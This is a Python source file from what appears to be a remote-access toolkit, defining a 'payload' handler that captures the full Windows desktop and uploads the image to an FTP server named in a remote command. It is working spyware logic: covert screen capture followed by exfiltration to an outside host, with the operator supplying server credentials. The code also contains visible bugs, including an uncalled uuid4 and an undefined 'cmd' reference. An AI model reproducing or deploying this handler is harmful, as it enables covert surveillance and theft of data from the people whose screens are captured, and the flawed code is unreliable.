import os
import sys
from uuid import  uuid4
from payloads.absract_payload_handler import AbstractPayloadHandler
from payloads.download_payload_handler import FTPDownloadPayloadHandler
from utils.debug_error_handler import ErrorLogHandler


error_logger= ErrorLogHandler()

class WindowsScreenshotPayloadHandler(AbstractPayloadHandler):
    def ftp_upload(self):
        FTPDownloadPayloadHandler().execute_payload("{} {} {} {} {}".format(
            "upload",self.cmd[2],self.cmd[3],self.cmd[4],self.image_file
        ))
        
    def bitmap_shot(self):
        import win32gui,win32ui,win32con,win32api
        cwd=os.getcwd()
        hdesktop = win32gui.GetDesktopWindow() 
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN) 
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC() 
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot) 
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY) 
        image_path='{}\\shot_{}.bmp'.format(cwd,str(uuid4))
        screenshot.SaveBitmapFile(mem_dc,image_path )
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())
        return image_path

    def upload_screenshot(self):
        mapper={
            "ftp":self.ftp_upload
            # example: screenshot ftp server username password
        }
        mapper[cmd[1]]()
    def execute_payload(self, data):
        
        try:
            self.cmd=data.decode("utf-8").split()
            self.image_file=self.bitmap_shot()
            self.upload_screenshot()
            return "Command execution successful, uploading\n"
        except Exception as e:
            error_logger.logError(sys.exc_info(), e, True)
            return "Command execution unsuccessful: {}\n".format(str(e))

